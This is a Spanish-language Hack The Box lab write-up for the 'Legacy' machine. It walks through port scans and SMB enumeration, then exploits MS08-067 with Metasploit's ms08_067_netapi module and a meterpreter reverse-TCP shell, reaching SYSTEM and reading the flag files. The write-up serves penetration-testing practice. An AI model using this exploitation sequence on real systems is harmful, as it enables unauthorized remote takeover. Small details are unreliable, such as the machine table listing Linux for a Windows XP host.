---
title: "HTB writeup: Legacy"
date: 2019-11-06T07:25:53-06:00
draft: true
description: ""
tags: ["hackthebox", "htb", "retired", "pentesting"]
categories: ["htb", "pentesting"]

---

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![legacy image](https://www.hackthebox.eu/storage/avatars/60dc190c4c015cfe3a3aef9b5afca254_thumb.png) [legacy](https://www.hackthebox.eu/home/machines/profile/2) | [ch4p](https://www.hackthebox.eu/home/users/profile/1) | Linux | 10.10.10.4 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-legacy/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` para identificar puertos udp y tcp abiertos:

```text

```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Como en otras ocasiones, verificamos los puertos abiertos con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.4

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-06 03:15:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 137/udp on 10.10.10.4
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sV -sC -p139,445,U:137 -v -n 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-05 22:58 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating Ping Scan at 22:58
Scanning 10.10.10.4 [4 ports]
Completed Ping Scan at 22:58, 0.26s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:58
Scanning 10.10.10.4 [2 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed SYN Stealth Scan at 22:58, 0.26s elapsed (2 total ports)
Initiating Service scan at 22:58
Scanning 2 services on 10.10.10.4
Completed Service scan at 22:58, 6.92s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 22:58
Completed NSE at 22:59, 51.78s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
map scan report for 10.10.10.4
Host is up (0.21s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h45m20s, deviation: 2h07m16s, median: -6h15m20s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a4:2c:5b (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-10-06T03:42:50+03:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.87 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p139,445,U:137` para unicamente los puertos descubiertos previamente
- `-n` para no ejecutar resoluciones


# NBT Service Enumeration

```text
(impacket-a2aNp99x) xbytemx@laptop:~/git/impacket$ nbtscan -v 10.10.10.4
Doing NBT name scan for addresses from 10.10.10.4


NetBIOS Name Table for Host 10.10.10.4:

Name             Service          Type
----------------------------------------
LEGACY           <00>             UNIQUE
HTB              <00>              GROUP
LEGACY           <20>             UNIQUE
HTB              <1e>              GROUP
HTB              <1d>             UNIQUE
__MSBROWSE__  <01>              GROUP

Adapter address: 00:50:56:a4:2c:5b
----------------------------------------
```

# SMB Service Enumeration

```
root@laptop:~# nmap -pT:445,U:137,T:139 -sU -sS -n -v -Pn --script smb-protocols.nse -sV -sC 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 07:53 CST
NSE: Loaded 46 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 07:53
Completed NSE at 07:53, 0.00s elapsed
Initiating NSE at 07:53
Completed NSE at 07:53, 0.00s elapsed
Initiating SYN Stealth Scan at 07:53
Scanning 10.10.10.4 [2 ports]
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
Completed SYN Stealth Scan at 07:53, 0.12s elapsed (2 total ports)
Initiating UDP Scan at 07:53
Scanning 10.10.10.4 [1 port]
Discovered open port 137/udp on 10.10.10.4
Completed UDP Scan at 07:53, 0.12s elapsed (1 total ports)
Initiating Service scan at 07:53
Scanning 3 services on 10.10.10.4
Completed Service scan at 07:53, 6.37s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 07:53
Completed NSE at 07:54, 50.68s elapsed
Initiating NSE at 07:54
Completed NSE at 07:54, 0.00s elapsed
Nmap scan report for 10.10.10.4
Host is up (0.083s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
137/udp open  netbios-ns   Microsoft Windows netbios-ns (workgroup: HTB)
Service Info: Host: LEGACY; OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-protocols:
|   dialects:
|_    NT LM 0.12 (SMBv1) [dangerous, but default]

NSE: Script Post-scanning.
Initiating NSE at 07:54
Completed NSE at 07:54, 0.00s elapsed
Initiating NSE at 07:54
Completed NSE at 07:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.91 seconds
           Raw packets sent: 3 (166B) | Rcvd: 3 (336B)
```

```
root@laptop:~# nmap -pT:445,U:137,T:139 -sU -sS -n -v -Pn --script vuln -sV -sC 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 08:07 CST
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:07
Completed NSE at 08:07, 10.00s elapsed
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Initiating SYN Stealth Scan at 08:07
Scanning 10.10.10.4 [2 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed SYN Stealth Scan at 08:07, 1.52s elapsed (2 total ports)
Initiating UDP Scan at 08:07
Scanning 10.10.10.4 [1 port]
Discovered open port 137/udp on 10.10.10.4
Completed UDP Scan at 08:07, 0.12s elapsed (1 total ports)
Initiating Service scan at 08:07
Scanning 3 services on 10.10.10.4
Completed Service scan at 08:07, 6.34s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.4.
Initiating NSE at 08:07
Completed NSE at 08:07, 5.25s elapsed
Initiating NSE at 08:07
Completed NSE at 08:07, 0.03s elapsed
Nmap scan report for 10.10.10.4
Host is up (0.079s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
137/udp open  netbios-ns   Microsoft Windows netbios-ns (workgroup: HTB)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: LEGACY; OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.06 seconds
           Raw packets sent: 4 (210B) | Rcvd: 3 (336B)
```

# Exploiting MS08-067

```
msf5 exploit(windows/smb/ms08_067_netapi) > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


msf5 exploit(windows/smb/ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.23      yes       The listen address (an interface may be specified)
   LPORT     3002             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) >
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.23:3002
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] Meterpreter session 2 opened (10.10.14.23:3002 -> 10.10.10.4:1030) at 2019-10-06 01:45:42 -0500

meterpreter >
```

```
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

# user.txt

```
meterpreter > type C:\Documents and Settings\john\Desktop\user.txt
```

# root.txt

```
meterpreter > type C:\Documents and Settings\Administrator\Desktop\root.txt
```

... And we got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
